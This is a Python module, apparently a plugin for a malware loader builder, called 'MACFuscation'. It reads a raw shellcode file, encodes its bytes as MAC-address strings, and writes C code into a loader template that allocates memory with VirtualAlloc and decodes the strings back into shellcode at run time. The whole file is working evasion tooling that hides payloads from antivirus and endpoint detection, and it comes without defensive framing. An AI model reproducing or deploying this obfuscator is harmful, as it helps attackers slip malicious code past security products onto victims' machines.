import os
import sys
import random

def desc():
    return "MACFuscation"

def getPayload():
    filename = './payload.bin'
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return file_content
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise
    
def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def shellcode_to_macs(data):
    mac_addresses = []

    # Check if the data is divisible by 6
    if len(data) % 6 != 0:
        # Add random bytes to make the data divisible by 6
        data += bytearray(random.choices(range(256), k=6 - len(data) % 6))

    # Split the data into chunks of 6 bytes
    for i in range(0, len(data), 6):
        chunk = data[i:i+6]
        
        # Create the MAC address
        ip = f"{chunk[0]:02x}-{chunk[1]:02x}-{chunk[2]:02x}-{chunk[3]:02x}-{chunk[4]:02x}-{chunk[5]:02x}"
        mac_addresses.append(ip)

    return mac_addresses

def create_macs_string(macs):
    macs_str = ""
    # Create the string with the MAC addresses
    for i, mac in enumerate(macs):
        macs_str += f"\"{mac}\", "
        if (i+1) % 3 == 0:
            # If its the last MAC address, don't add a new line
            if i != len(macs) - 1:
                macs_str += "\n\t"
            
    # Remove the last comma
    macs_str = macs_str[:-2]

    return macs_str

def fill_template(obfuscated, original_data_size, num_macs):
    libs = f"#define SHELLCODE_SIZE	{original_data_size}\n#define NUM_MACS			{num_macs}"
    functions = ''' \
// Deobfuscate the shellcode
VOID DeobfuscateShellcode(unsigned char *ObsShellcode[], PBYTE DeobsShellcode) {
    // Filler variable to track progress
    int filler = 0;
    // For each MAC
    for (int i = 0; i < NUM_MACS; i++) {
        // For each byte in the MAC
        for (int j = 0; j < strlen(ObsShellcode[i]); j++) {
            if (ObsShellcode[i][j] == '-') {
                continue;
            }
            else {
                // If we have filled the buffer, break
                if (filler >= SHELLCODE_SIZE) {
                    break;
                }
                // Convert the hex string to a byte
                char hex[3] = { ObsShellcode[i][j], ObsShellcode[i][j + 1], '\0' };
                DeobsShellcode[filler] = (BYTE)strtol(hex, NULL, 16);
                filler++;
                j++;
            }
        }
    }
}
'''

    payload_mods = ''' \
    SIZE_T      	sPayloadSize	= SHELLCODE_SIZE;

    // Allocating buffer to hold decrypted shellcode
    PBYTE pShellcode = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy encrypted shellcode to decrypted shellcode buffer
    if (pShellcode)
        memcpy(pShellcode, pPayload, sPayloadSize);

    // Deobfuscation
    DeobfuscateShellcode(pPayload, pShellcode);
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("const unsigned char pPayload[] = {", "unsigned char *pPayload[] = {") \
                              .replace("{{PAYLOAD}}", obfuscated) \
                              .replace("{{PAYLOAD_MODS}}", payload_mods)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

def run():
    original_data = getPayload()

    # Number of bytes in the original data
    original_data_size = len(original_data)

    # Convert the original data to MAC addresses
    obfuscated_data = shellcode_to_macs(original_data)

    # Create the string with the MAC addresses
    macs_str = create_macs_string(obfuscated_data)

    # Fill template
    fill_template(macs_str, str(original_data_size), len(obfuscated_data))

    return